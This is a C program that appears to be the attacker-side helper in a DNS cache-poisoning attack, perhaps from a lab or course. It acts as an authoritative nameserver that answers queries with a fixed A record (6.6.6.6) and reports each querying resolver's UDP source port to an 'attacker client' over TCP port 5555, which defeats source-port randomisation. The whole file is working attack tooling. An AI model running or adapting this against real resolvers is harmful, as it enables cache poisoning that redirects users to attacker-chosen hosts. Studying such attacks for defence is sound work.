#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <ldns/ldns.h>

#define CONTROL_PORT 5555    // TCP port for communication with the attacker client
#define DNS_PORT     53    // UDP port for sending a DNS query to the DNS recursive resolver
#define BUFFER_SIZE  512

//create a listening socket
static int create_control_server_socket(void) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        return -1;
    }
    int opt = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, (socklen_t)sizeof(opt)) < 0) {
        close(sockfd);
        return -1;
    }
    opt = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEPORT, &opt, (socklen_t)sizeof(opt)) < 0) {
        close(sockfd);
        return -1;
    }
    // listen to port 5555 and be able to accept connections for every ip address
    struct sockaddr_in addr;
    (void)memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_ANY); // any address
    addr.sin_port = htons((uint16_t)CONTROL_PORT); // port 5555
    if (bind(sockfd, (struct sockaddr *)&addr,
             (socklen_t)sizeof(addr)) < 0) {
        close(sockfd);
        return -1;
    }
    if (listen(sockfd, 1) < 0) {
        close(sockfd);
        return -1;
    }
    return sockfd;
}

// establish a new tcp stream socket
static int accept_control_client(int listen_fd) {
    struct sockaddr_in client_addr;
    socklen_t client_len = (socklen_t)sizeof(client_addr);
    int connfd = accept(listen_fd, (struct sockaddr *)&client_addr, &client_len);
    if (connfd < 0) {
        return -1;
    }
    return connfd;
}

// send the generated UDP Port of dns resolver to the client
static int send_resolver_port_to_client(int tcp_fd, uint16_t src_port) {
    uint16_t port_net_format = htons(src_port);
    ssize_t total = (ssize_t)sizeof(port_net_format);
    ssize_t sent = send(tcp_fd, &port_net_format, (size_t)total, 0);
    if (sent != total) {
        return -1;
    }
    return 0;
}

// create a UDP Socket for communication with the DNS Recursive Resolver
static int create_dns_udp_socket(void) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        return -1;
    }
    struct sockaddr_in addr;
    (void)memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons((uint16_t)DNS_PORT); // we know for dns *queries only* the port is 53
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    if (bind(sockfd, (struct sockaddr *)&addr, (socklen_t)sizeof(addr)) < 0) {
        close(sockfd);
        return -1;
    }
    return sockfd;
}

// function to send a full A response from the nameserver to the resolver
static void send_simple_a_response(int dns_sock, ldns_pkt *query, ldns_rr *q_rr, const char *qname_str,
                                    const struct sockaddr_in *resolver_addr, socklen_t resolver_len) {
    if (query == NULL) {
        return;
    }
    ldns_pkt *response = ldns_pkt_new();
    if (response == NULL) {
        return;
    }
    ldns_pkt_set_id(response, ldns_pkt_id(query)); // copy original TXID from query to the response
    ldns_pkt_set_qr(response, true); // set to 1 = this is a response
    ldns_pkt_set_aa(response, true); // set to 1 = this is authoritative
    ldns_pkt_set_rcode(response, LDNS_RCODE_NOERROR);
    // copy question section
    if (q_rr != NULL) {
        ldns_rr *question_clone = ldns_rr_clone(q_rr);
        if (question_clone != NULL) {
            (void)ldns_pkt_push_rr(response, LDNS_SECTION_QUESTION, question_clone);
        }
    }
    // add a simple A record answer for the same name, e.g. 1.1.1.1
    if (qname_str != NULL) {
        ldns_rr *a_record = NULL;
        char a_str[BUFFER_SIZE];
        (void)snprintf(a_str, sizeof(a_str), "%s 600 IN A 6.6.6.6", qname_str); // write A RR response in char format

        if (ldns_rr_new_frm_str(&a_record, a_str, 0, NULL, NULL) == LDNS_STATUS_OK && a_record != NULL) {
            (void)ldns_pkt_push_rr(response, LDNS_SECTION_ANSWER, a_record);
        } else {
            if (a_record != NULL) {
                ldns_rr_free(a_record);
            }
        }
    }

    // serialize and send
    uint8_t *resp_data = NULL;
    size_t resp_size = 0U;
    if (ldns_pkt2wire(&resp_data, response, &resp_size) == LDNS_STATUS_OK && resp_data != NULL) {
        (void)sendto(dns_sock, resp_data, resp_size, 0, (const struct sockaddr *)resolver_addr, resolver_len);
        free(resp_data);
    }
    ldns_pkt_free(response);
}

// handle a single dns query: receive a packet, process using ldns, get udp port, send to client
static int handle_one_dns_query(int dns_sock, int control_fd) {
    uint8_t buffer[BUFFER_SIZE];
    struct sockaddr_in resolver_addr;
    socklen_t resolver_len = (socklen_t)sizeof(resolver_addr);

    ssize_t len = recvfrom(dns_sock, buffer, (size_t)sizeof(buffer), 0, (struct sockaddr *)&resolver_addr, &resolver_len);
    if (len <= 0) {
        return 0; // continue loop in main and listen to more queries (UDP packets)
    }

    // process the dns packet using ldns
    ldns_pkt *query = NULL;
    ldns_status status = ldns_wire2pkt(&query, buffer, (size_t)len); // wire protocol to ldns
    if (status != LDNS_STATUS_OK || query == NULL) {
        return 0; // continue loop in main and listen to more queries (UDP packets)
    }

    uint16_t src_port = (uint16_t)ntohs(resolver_addr.sin_port); // extract PORT
    ldns_rr_list *q_list = ldns_pkt_question(query); // get the question section (list of question RRs) from the parsed DNS packet
    ldns_rr *q_rr = NULL; // will hold the first question RR
    char *qname_str = NULL; // will hold the domain name (qname) as a C string

    if (q_list != NULL && ldns_rr_list_rr_count(q_list) > 0U) { // make sure there is at least one question RR in the list
        q_rr = ldns_rr_list_rr(q_list, 0U); // take the first question RR from the question section
        if (q_rr != NULL) {
            ldns_rdf *owner = ldns_rr_owner(q_rr); // get the owner field of this RR (the queried domain name, as an LDNS rdf)
            if (owner != NULL) {
                qname_str = ldns_rdf2str(owner); // convert the owner (qname) from LDNS rdf to a newly allocated C string
            }
        }
    }
    send_simple_a_response(dns_sock, query, q_rr, qname_str, &resolver_addr, resolver_len); // send A resposne to DNS resolver
    (void)send_resolver_port_to_client(control_fd, src_port); // send the relevant UDP Port to attacker client

    if (qname_str != NULL) {
        free(qname_str);
    }
    ldns_pkt_free(query);
    return 0;
}

int main(void) {
    int dns_sock = create_dns_udp_socket(); // create a udp socket for communication with the dns resolver
    if (dns_sock < 0) {
        return EXIT_FAILURE;
    }
    int control_listen_fd = create_control_server_socket(); // create listening socket for the incoming client TCP
    if (control_listen_fd < 0) {
        close(dns_sock);
        return EXIT_FAILURE;
    }
    int control_fd = accept_control_client(control_listen_fd); // accept the incoming attacker client TCP connection
    if (control_fd < 0) {
        close(control_listen_fd);
        close(dns_sock);
        return EXIT_FAILURE;
    }
    // main loop, server keeps on sending
    for (;;) {
        (void)handle_one_dns_query(dns_sock, control_fd);
    }
    close(dns_sock);
    close(control_fd);
    close(control_listen_fd);
    return 0;
}
